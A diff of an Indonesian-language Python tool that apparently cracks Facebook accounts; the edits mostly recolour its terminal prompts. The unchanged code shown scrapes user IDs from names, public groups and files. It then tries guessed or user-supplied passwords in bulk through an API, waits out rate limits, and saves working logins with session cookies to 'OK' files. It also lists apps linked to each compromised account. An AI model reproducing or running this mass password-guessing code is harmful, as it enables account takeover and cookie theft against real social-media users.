@@ -220,16 +220,16 @@ class Menu:
 			
 		###----------[ USERNAME ]---------- ###
 		elif menu in["5","05"]:
-			prints(Panel(f"""{P2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
-			limit = console.input(f" {H2}• {P2}masukan limit : ")
+			prints(Panel(f"""{K2}masukan nama dan jika 2 kata bisa gunakan titik '.' sebagai pemisah""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan nama : ")
+			limit = console.input(f" {M2}• {K2}masukan limit : ")
 			Dump(cookie).Dump_Username(user,limit)
 			Crack().atursandi()
 			
 		###----------[ PENCARIAN NAMA ]---------- ###
 		elif menu in["6","06"]:
 			prints(Panel(f"""{P2}kamu bisa menggunakan koma (,) sebagai pemisah jika lebih dari 1 nama""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan nama : ")
+			user = console.input(f" {M2}• {K2}masukan nama : ")
 			common = open("asset/nama_indonesia","r").read().splitlines()
 			for idt in user.split(","):
 				self.id.append(idt)
@@ -243,15 +243,15 @@ class Menu:
 		
 		###----------[ MEMBER GRUP ]---------- ###
 		elif menu in["7","07"]:
-			prints(Panel(f"""{P2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan id grup : ")
+			prints(Panel(f"""{K2}masukan id grup, pastikan grup bersifat publik dan tidak private""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan id grup : ")
 			Dump(cookie).Dump_MemberGrup(f"https://mbasic.facebook.com/groups/{user}")
 			Crack().atursandi()
 			
 		###----------[ FILE MASSAL ]---------- ###
 		elif menu in["8","08"]:
-			prints(Panel(f"""{P2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
-			user = console.input(f" {H2}• {P2}masukan tempat file : ")
+			prints(Panel(f"""{K2}masukan tempat file, pastikan izin ke penyimpanan sudah diaktifkan""",width=80,style=f"{color_panel}"))
+			user = console.input(f" {M2}• {K2}masukan tempat file : ")
 			Dump(cookie).Dump_File(user)
 			Crack().atursandi()
 
@@ -345,7 +345,7 @@ class Dump:
 						else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
 					if uid+"<=>"+nama in tampung:pass
 					else:tampung.append(uid+"<=>"+nama)
-					console.print(f" {H2}• {P2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
+					console.print(f" {M2}• {K2}sedang proses mengumpulkan id, berhasil mendapatkan {len(tampung)} id....", end="\r")
 			for x in data.find_all("a",href=True):
 				if "Lihat Postingan Lainnya" in x.text:
 					self.Dump_MemberGrup("https://mbasic.facebook.com"+x.get("href"))
@@ -398,21 +398,21 @@ class Crack:
 		
 	###----------[ ATUR SANDI DAN METODE ]---------- ###
 	def atursandi(self):
-		prints(Panel(f"""{P2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
+		prints(Panel(f"""{K2}berhasil mengumpulkan {len(tampung)} id""",width=80,padding=(0,21),style=f"{color_panel}"))
 		set = console.input(f" {M2}• {K2}apakah kamu ingin menggunakan sandi manual?(y/n) : ")
 		
 		###----------[ SANDI MANUAL ]---------- ###
 		if set in["Y","y"]:
-			prints(Panel(f"""{P2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
-			pwx = console.input(f" {H2}• {P2}buat katasandi : ").split(",")
+			prints(Panel(f"""{K2}silahkan buat katasandi dengan , (koma) sebagai pemisah tiap katasandi""",width=80,style=f"{color_panel}"))
+			pwx = console.input(f" {M2}• {K2}buat katasandi : ").split(",")
 			if len(pwx)<=5:
 				prints(Panel(f"""{M2}katasandi harus minimal 6 huruf""",width=80,style=f"{color_panel}"))
 				exit()
 
   	###----------[ SANDI OTOMATIS ]---------- ###
 		else:
-			prints(Panel(f"""{P2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
-			app = console.input(f" {H2}• {P2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
+			prints(Panel(f"""{K2}memunculkan aplikasi bisa membuat akun terkena checkpoint/dinonaktifkan""",width=80,style=f"{color_panel}"))
+			app = console.input(f" {M2}• {K2}apakah kamu ingin memunculkan aplikasi terkait?(y/n) : ")
 			if app in["Y","y"]:
 				self.apk.append("muncul")
 			else:
@@ -432,7 +432,7 @@ class Crack:
 					nama = data.split("<=>")[1]
 					pwx = pw
 					fall.submit(self.metode_api,user,pwx)
-		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
+		prints(Panel(f"""{P2}berhasil crack total {len(tampung)} id, dengan hasil OK : {H2}{len(self.ok)}{K2} CP : {K2}{len(self.cp)}{P2}""",width=80,padding=(0,8),style=f"{color_panel}"))
 		sys.exit()
 						
 	###----------[ CRACK OTOMATIS ]---------- ###
@@ -517,7 +517,7 @@ class Crack:
 							self.get_apk(user,pw,cookie)
 						else:
 							tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-							tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
+							tree.add(Panel(f"{M2}{cookie}{K2}",style=f"{color_panel}"))
 							prints(tree)
 							#os.popen('play-audio o.mp3')
 						open(f"OK/{self.hari_ini}.txt","a").write(f"{user}|{pw}|{cookie}\n")
@@ -528,14 +528,14 @@ class Crack:
 						break
 					else:
 						self.cp.append(user)
-						tree = Tree(Panel.fit(f"""{K2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
-						tree.add(Panel(f"{K2}{ua}{P2}",style=f"{color_panel}"))
+						tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
+						tree.add(Panel(f"{M2}{ua}{K2}",style=f"{color_panel}"))
 						prints(tree)
 						#os.popen('play-audio c.mp3')
 						open(f"CP/{self.hari_ini}.txt","a").write(f"{user}|{pw}\n")
 						break
 				elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-					prog.update(des,description=f" {H2}•{P2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {H2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{P2}")
+					prog.update(des,description=f" {M2}•{K2} crack {M2}spam{P2} {str(self.loop)}/{len(tampung)} OK : {M2}{len(self.ok)}{P2} CP : {K2}{len(self.cp)}{K2}")
 					prog.advance(des)
 					time.sleep(30)
 				else:continue
@@ -585,10 +585,10 @@ class Crack:
 		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
 		self.apkkadaluwarsa("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
 		if len(self.kadaluwarsa)==0:
-			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
+			kadalu.add(f"{K2}tidak ada aplikasi yang terkait")
 		else:
 			for apk in self.kadaluwarsa:
-				kadalu.add(f"{M2}{apk}{P2}")
+				kadalu.add(f"{M2}{apk}{K2}")
 			
 		###----------[ PRINT SEMUA ]---------- ###
 		tree = Tree(Panel.fit(f"""{M2}{user}|{pw}{K2}""",style=f"{color_panel}"),guide_style="bold grey100")
@@ -632,7 +632,7 @@ class Lain:
 		
 	###----------[ MENU ]---------- ###
 	def menu(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
+		prints(Panel(f"""{K2}[{color_text}01{K2}]. lihat akun hasil crack  [{color_text}04{K2}]. ganti warna tema tools
 [{color_text}02{K2}]. get info akun target    [{color_text}05{K2}]. tampilkan info cookies
 [{color_text}03{K2}]. setting user agent      [{color_text}06{K2}]. logout ({M2}hapus login{K2})""",width=80,padding=(0,7),style=f"{color_panel}"))
 		menu = console.input(f" {H2}• {P2}pilih menu : ")
@@ -658,15 +658,15 @@ class Lain:
 		
 		###----------[ PILIH FILE ]---------- ###
 		dirs = os.listdir(folder)
-		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
+		prints(Panel(f"""{K2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=80,padding=(0,15),style=f"{color_panel}"))
 		num = 0
 		for fil in dirs:
 			num += 1
 			self.file.append(fil)
 			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
-			self.listfile.append(Panel(f"{K2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{K2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
-			self.listfile.append(Panel(f"{K2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}[{color_text}0{num}{K2}]",width=10,title=f"{K2}nomer",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}{fil}",width=35,title=f"{K2}tanggal",style=f"{color_panel}"))
+			self.listfile.append(Panel(f"{K2}{len(totalakun)} akun",width=28,title=f"{K2}total akun",style=f"{color_panel}"))
 		console.print(Columns(self.listfile))
 		prints(Panel(f"""{K2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=80,style=f"{color_panel}"))
 		result = console.input(f" {M2}• {K2}masukan angka : ")
@@ -696,11 +696,11 @@ class Lain:
 		
 	###----------[ GANTI WARNA TEMA ]---------- ###
 	def ganti_tema(self):
-		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
-[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
-[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
-[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
-[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
+		prints(Panel(f"""{K2}[{color_text}01{K2}]. ganti warna tema merah  [{color_text}06{K2}]. ganti warna tema pink
+[{color_text}02{K2}]. ganti warna tema hijau  [{color_text}07{K2}]. ganti warna tema cyan
+[{color_text}03{K2}]. ganti warna tema kuning [{color_text}08{K2}]. ganti warna tema putih
+[{color_text}04{K2}]. ganti warna tema biru   [{color_text}09{K2}]. ganti warna tema orange
+[{color_text}05{K2}]. ganti warna tema ungu   [{color_text}10{K2}]. ganti warna tema abu2""",width=80,padding=(0,7),style=f"{color_panel}"))
 		ask = console.input(f" {H2}• {P2}pilih tema : ")
 		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
 		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
@@ -726,8 +726,8 @@ class Lain:
 		if now.month+1 > 12:tahun = now.year+1
 		data = date(year=tahun,month=bulan,day=hari)
 		aktif = data.strftime("%d %B %Y")
-		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
-		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
+		console.print(f" {M2}• {K2}aktif sampai : {aktif}")
+		prints(Panel(f"""{M2}{self.cookie.get('cookie')}""",width=80,style=f"{color_panel}"))
 		sys.exit()
 		
 ###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
